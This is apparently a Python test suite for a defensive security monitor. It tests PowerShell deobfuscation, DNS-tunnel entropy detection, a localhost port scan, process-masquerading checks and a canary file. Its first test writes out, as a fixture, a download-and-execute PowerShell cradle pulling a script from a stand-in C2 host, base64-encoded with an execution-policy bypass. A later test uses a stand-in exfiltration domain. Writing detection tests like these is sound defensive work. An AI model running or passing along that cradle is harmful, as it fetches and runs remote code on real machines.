import sys
import os
import json
import base64

# Add project root to sys.path
sys.path.insert(0, os.getcwd())

print("=" * 60)
print("MiniSOC Multi-Vector Anti-Evasion & Scanning Test Suite")
print("=" * 60)

# ── Test 1: Base64 PowerShell De-obfuscation ──────────────────
print("\n[1] Testing PowerShell Base64 Auto-Deobfuscation...")
from agent.endpoint_agent import deobfuscate_powershell_cmd

# Payload: IEX (New-Object Net.WebClient).DownloadString('http://c2.bad/p.ps1')
original_script = "IEX (New-Object Net.WebClient).DownloadString('http://c2.bad/p.ps1')"
b64_payload = base64.b64encode(original_script.encode('utf-16le')).decode('ascii')
obfuscated_cmd = f"powershell.exe -NoProfile -ExecutionPolicy Bypass -enc {b64_payload}"

decoded = deobfuscate_powershell_cmd(obfuscated_cmd)
print(f"  Input CLI:   {obfuscated_cmd[:65]}...")
print(f"  Decoded:     {decoded}")
assert decoded == original_script, f"FAIL: Expected '{original_script}', got '{decoded}'"
print("  [+] PASS: Transparent Base64 de-obfuscation verified.")

# ── Test 2: DNS Tunneling & DGA Entropy Detection ──────────────
print("\n[2] Testing DNS Tunneling & Shannon Entropy Detection...")
from network.nsm_engine import calculate_shannon_entropy, detect_dns_tunneling

normal_domain = "api.github.com"
dga_tunnel_domain = "a8f9c1d2e3b4m5n6p7q8r9s0t1u2v3w4x5y6z7.tunnel.exfil-data.attacker.com"

res_normal = detect_dns_tunneling(normal_domain)
res_tunnel = detect_dns_tunneling(dga_tunnel_domain)

print(f"  Normal Domain: '{normal_domain}' -> Suspicious: {res_normal['suspicious']} (Entropy: {res_normal['entropy']})")
print(f"  Tunnel Domain: '{dga_tunnel_domain[:35]}...' -> Suspicious: {res_tunnel['suspicious']} (Entropy: {res_tunnel['entropy']})")
assert res_normal["suspicious"] is False, "FAIL: Normal domain falsely flagged"
assert res_tunnel["suspicious"] is True, "FAIL: High-entropy DNS tunnel was not flagged"
print("  [+] PASS: DNS Tunneling & DGA heuristic verified.")

# ── Test 3: Active Subnet IP & Port Discovery Scanner ──────────
print("\n[3] Testing Active Subnet Discovery Scanner...")
from network.nsm_engine import scan_subnet_range

# Sweep localhost
scan_res = scan_subnet_range("127.0.0.1/32", ports=[80, 443, 5000, 8080], timeout=0.2)
print(f"  Target:          {scan_res.get('subnet')}")
print(f"  Scanned IPs:     {scan_res.get('scanned_ips')}")
print(f"  Live Hosts:      {scan_res.get('live_hosts_count')}")
print(f"  Duration:        {scan_res.get('scan_duration_sec')}s")
assert "error" not in scan_res, f"FAIL: Subnet scan error: {scan_res.get('error')}"
assert scan_res.get("scanned_ips") == 1, "FAIL: Expected 1 scanned IP"
print("  [+] PASS: Subnet scanner executed cleanly.")

# ── Test 4: Process Masquerading Heuristic ─────────────────────
print("\n[4] Testing Process Masquerading Detection Heuristic...")
SYSTEM_BINARIES = {
    'svchost.exe': r'c:\windows\system32',
    'lsass.exe': r'c:\windows\system32',
    'explorer.exe': r'c:\windows'
}
SUSPICIOUS_DIRS = ['\\appdata\\', '\\temp\\', '\\tmp\\', '\\users\\', '\\downloads\\', '\\programdata\\']

def is_masqueraded(name, path):
    name_l = name.lower()
    path_l = path.lower()
    if name_l in SYSTEM_BINARIES and path_l:
        expected = SYSTEM_BINARIES[name_l]
        if not path_l.startswith(expected) or any(k in path_l for k in SUSPICIOUS_DIRS):
            return True
    return False

legit_svchost = r"C:\Windows\System32\svchost.exe"
fake_svchost = r"C:\Users\JohnDoe\AppData\Local\Temp\svchost.exe"

assert not is_masqueraded("svchost.exe", legit_svchost), "FAIL: Legitimate svchost flagged"
assert is_masqueraded("svchost.exe", fake_svchost), "FAIL: Rogue svchost in Temp not flagged"
print(f"  Legitimate Path: '{legit_svchost}' -> Masqueraded: False")
print(f"  Malicious Path:  '{fake_svchost}' -> Masqueraded: True")
print("  [+] PASS: Process masquerading detection verified.")

# ── Test 5: Honey-Token Canary File Trap ───────────────────────
print("\n[5] Testing Canary File Trap Initialization...")
from agent.endpoint_agent import ensure_canary_trap, check_canary_trap, CANARY_FILE

ensure_canary_trap()
assert os.path.exists(CANARY_FILE), "FAIL: Canary file was not created"
canary_check = check_canary_trap()
# Under normal state with untouched canary, no alert should fire
assert canary_check is None, f"FAIL: Unexpected canary alert on pristine file: {canary_check}"
print(f"  Canary File Path: '{CANARY_FILE}' -> Verified intact.")
print("  [+] PASS: Canary Honey-Token mechanism operational.")

print("\n" + "=" * 60)
print("[+] ALL 5 ANTI-EVASION & SCANNING TEST SUITES PASSED!")
print("=" * 60)
